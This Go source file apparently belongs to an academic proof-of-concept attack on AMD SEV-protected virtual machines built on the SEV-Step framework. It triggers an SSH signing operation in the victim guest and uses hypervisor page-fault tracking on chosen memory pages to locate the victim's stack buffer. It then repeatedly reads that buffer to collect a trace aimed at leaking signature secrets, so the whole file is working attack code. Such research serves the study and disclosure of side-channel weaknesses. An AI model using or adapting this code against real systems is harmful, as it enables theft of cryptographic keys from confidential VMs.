package main

import (
	"bytes"
	"context"
	"encoding/gob"
	"fmt"
	"log"
	"pfFingerprint"
	"pfFingerprint/trigger"
	"time"

	"github.com/UzL-ITS/sev-step/sevStep"
)

//recordAttackTrace triggers victim and returns an "attack trace" containing memory reads for certain addresses as
//well as the gpa of the stack buffer
func recordAttackTrace(ctx context.Context, appConfig *application, attackConfig *attackConfiguration) ([]*sevStep.Event, uint64, trigger.SSHSignatureMessage, error) {

	ioctlAPI, err := sevStep.NewIoctlAPI(appConfig.kvmDevicePath, appConfig.tryGetRIP)
	if err != nil {
		return nil, 0, trigger.SSHSignatureMessage{}, fmt.Errorf("failed to init API : %v", err)
	}

	defer func() {
		if err := ioctlAPI.Close(); err != nil {
			log.Printf("Failed to close ioctl api : %v", err)
		}
	}()
	defer func() {
		if err := ioctlAPI.CmdUnTrackAllPages(sevStep.PageTrackWrite); err != nil {
			log.Printf("failed to untrack all : %v", err)
		}
	}()

	//initial tracking
	if err := ioctlAPI.CmdTrackPage(attackConfig.chosetTGPA, sevStep.PageTrackExec); err != nil {
		return nil, 0, trigger.SSHSignatureMessage{}, fmt.Errorf("failed to track attackConfig.chosetTGPA : %v", err)
	}
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()
	sigMsg := trigger.SSHSignatureMessage{}
	go func() {
		defer cancel()
		log.Printf("Triggering victim\n")
		rawSigData, err := appConfig.trigger.Execute()
		if err != nil {
			log.Printf("Trigger execution failed : %v", err)
		}
		if err := gob.NewDecoder(bytes.NewReader(rawSigData)).Decode(&sigMsg); err != nil {
			log.Printf("Failed to parse signature transmitted by ssh")
		}
		log.Printf("Victim done\n")
	}()

	attackEvents := make([]*sevStep.Event, 0)

	//periodically print event count
	progressTicker := time.NewTimer(10 * time.Second)
	go func() {
		for {

			select {
			case <-ctx.Done():
				progressTicker.Stop()
				log.Printf("Captured %v events\n", len(attackEvents))
				return
			case <-progressTicker.C:
				log.Printf("Captured %v events so far\n", len(attackEvents))
			}
		}
	}()

	var mainLoopErr error
	var ev *sevStep.Event
	//counts fault for scalarMul and chooseT GPA combined
	//counts faults for sclarMul GPA
	writeTrackInProgress := false
	accessTrackEvents := make([]*sevStep.Event, 0)
	stackBufferGPA := uint64(0)

	ct := attackConfig.chosetTGPA
	fe64 := attackConfig.fe64GPA
	finishedIgnoreSequence := false
	//before we can start tracking, we have to wait for some unrelated accesses to finish
	ignoreFaultSequence := []uint64{ct, fe64, ct, fe64}
	//access for "choose_t" tracking
	attackFaultSequence := []uint64{ct, fe64, ct, fe64, ct, fe64, ct, fe64, ct, fe64, ct, fe64, ct, fe64, ct, fe64, ct, fe64, ct, fe64, ct, fe64}
	idxIsSavePoint := map[int]bool{1: true, 3: true, 5: true, 7: true, 9: true, 11: true, 13: true, 15: true, 19: true, 20: true}
	faultSequence := ignoreFaultSequence
	sequenceIDX := 0
	sequenceCycleCount := 0
	idxStartWriteTrack := 1
	idxStopWriteTrack := idxStartWriteTrack + 1
	var mem []byte
	for {
		ev, mainLoopErr = pfFingerprint.WaitForEventBlocking(ctx, ioctlAPI)
		if mainLoopErr != nil {
			break
		}

		//
		// handle printing/saving events
		//
		switch ev.FaultedGPA {
		case attackConfig.fe64GPA:
			fallthrough
		case attackConfig.chosetTGPA:
			if stackBufferGPA != 0 && idxIsSavePoint[sequenceIDX] && attackFaultSequence[sequenceIDX] == ev.FaultedGPA {
				appConfig.debugLog.Printf("Reading stack buf %x at RIP %x\n", stackBufferGPA, ev.RIP)
				mem, mainLoopErr = ioctlAPI.CmdReadGuestMemory(stackBufferGPA, 4096, true, appConfig.cpu)
				if mainLoopErr != nil {
					return nil, 0, trigger.SSHSignatureMessage{}, fmt.Errorf("Failed to read guest memory : %v\n", mainLoopErr)
				}
				ev.Content = mem
				ev.MonitorGPA = stackBufferGPA
			}
			attackEvents = append(attackEvents, ev)
		default:
			if writeTrackInProgress {
				accessTrackEvents = append(accessTrackEvents, ev)
			}
		}

		//
		// handle re-tracking
		//
		switch ev.FaultedGPA {
		case faultSequence[sequenceIDX]:

			appConfig.debugLog.Printf("Cycle idx %v, sequence idx %v at RIP %x\n", sequenceCycleCount, sequenceIDX, ev.RIP)

			//start write track for stack buffer search
			if finishedIgnoreSequence && sequenceIDX == idxStartWriteTrack && sequenceCycleCount == 0 {
				log.Printf("Starting write track\n")
				if err := ioctlAPI.CmdTrackAllPages(sevStep.PageTrackAccess); err != nil {
					return nil, 0, trigger.SSHSignatureMessage{}, fmt.Errorf("fault sequence idx %v cycle %v, failed to track all : %v", sequenceIDX, sequenceCycleCount, err)
				}
				writeTrackInProgress = true
			}
			//stop write track for stack buffer; search and set stackBufferGPA
			if finishedIgnoreSequence && sequenceIDX == idxStopWriteTrack && sequenceCycleCount == 0 {
				writeTrackInProgress = false
				if err := ioctlAPI.CmdUnTrackAllPages(sevStep.PageTrackAccess); err != nil {
					return nil, 0, trigger.SSHSignatureMessage{}, fmt.Errorf("fault sequence idx %v cycle %v, failed to untrack all : %v", sequenceIDX, sequenceCycleCount, err)
				}

				for _, v := range accessTrackEvents {
					faultReason, err := sevStep.ErrorCodeToString(v.ErrorCode)
					if err != nil {
						log.Printf("Failed to parse fault reason : %v", err)
					}
					if !sevStep.ArePfErrorsSet(v.ErrorCode, sevStep.PfErrorFetch) {
						appConfig.debugLog.Printf("%v Error Code %v, RetInstr %v\n", v, faultReason, v.RetiredInstructions)
					}
				}
				stackBufEvent, ok := extractStackPage(accessTrackEvents)
				if !ok {
					return nil, 0, trigger.SSHSignatureMessage{}, fmt.Errorf("failed to select stackbuf address from write fault list")
				}
				stackBufferGPA = stackBufEvent.FaultedGPA
				log.Printf("Write track stopped. Got %v events StackBufferGPA is %x. Access was at RIP %x\n", len(accessTrackEvents), stackBufferGPA, stackBufEvent.RIP)
				if len(attackEvents) == 0 {
					return nil, 0, trigger.SSHSignatureMessage{}, fmt.Errorf("len of attackEvents slice was zero while trying to save first stack buf access")
				}
				appConfig.debugLog.Printf("Reading stack buf %x at RIP %x\n", stackBufferGPA, ev.RIP)

				mem, mainLoopErr = ioctlAPI.CmdReadGuestMemory(stackBufferGPA, 4096, true, appConfig.cpu)
				if mainLoopErr != nil {
					return nil, 0, trigger.SSHSignatureMessage{}, fmt.Errorf("Failed to read guest memory : %v\n", mainLoopErr)
				}
				attackEvents[len(attackEvents)-1].Content = mem
				attackEvents[len(attackEvents)-1].MonitorGPA = stackBufferGPA
			}

			sequenceIDX = (sequenceIDX + 1) % len(faultSequence)
			if err := ioctlAPI.CmdTrackPage(faultSequence[sequenceIDX], sevStep.PageTrackExec); err != nil {
				return nil, 0, trigger.SSHSignatureMessage{}, fmt.Errorf("fault sequence idx %v cycle %v, failed to track %x", sequenceIDX, sequenceCycleCount, faultSequence[sequenceIDX])
			}
			if sequenceIDX == 0 {
				if !finishedIgnoreSequence {
					appConfig.debugLog.Printf("Finished initial ignore cycle")
					faultSequence = attackFaultSequence
					finishedIgnoreSequence = true
				} else {
					appConfig.debugLog.Printf("cycle %v done\n", sequenceCycleCount)
					sequenceCycleCount++
				}

			}
		default:
			if !writeTrackInProgress {
				log.Printf("unexpected fault at %v\n", ev.FaultedGPA)
			}
		}

		if mainLoopErr = ioctlAPI.CmdAckEvent(ev.ID); mainLoopErr != nil {
			return nil, 0, trigger.SSHSignatureMessage{}, fmt.Errorf("failed to ack event %v : %v", ev.ID, mainLoopErr)
		}
	}

	return attackEvents, stackBufferGPA, sigMsg, nil
}

//extractStackPage returns the event containing the memory access to the stack buffer that we want
//to observe
func extractStackPage(events []*sevStep.Event) (*sevStep.Event, bool) {
	//look for sequence write,write,write,user with rips 0,0,0,0. Last fault (user) is the stack page
	//More robust solution would be to save multiple pages per event. Would require changes
	//to the event struct that is used in a lot of places

	var state int
	var stackBufEvent *sevStep.Event
	const elemsFromBack = 10
	offset := len(events) - elemsFromBack
	var v *sevStep.Event
	for i := offset; i < len(events) && stackBufEvent == nil; i++ {
		log.Printf("Scanning from %v\n", i)
		state = 0
		for j := 0; j < elemsFromBack && i+j < len(events) && stackBufEvent == nil; j++ {
			v = events[i+j]
			switch state {
			case 0:
				fallthrough
			case 1:
				fallthrough
			case 2:
				if sevStep.ArePfErrorsSet(v.ErrorCode, sevStep.PfErrorWrite) && v.RetiredInstructions == 0 {
					state++
				} else {
					state = 0
				}
			case 3:
				if !sevStep.ArePfErrorsSet(v.ErrorCode, sevStep.PfErrorWrite) && v.RetiredInstructions == 0 {
					stackBufEvent = v
				} else {
					state = 0
				}
			}

		}
	}
	return stackBufEvent, stackBufEvent != nil
}
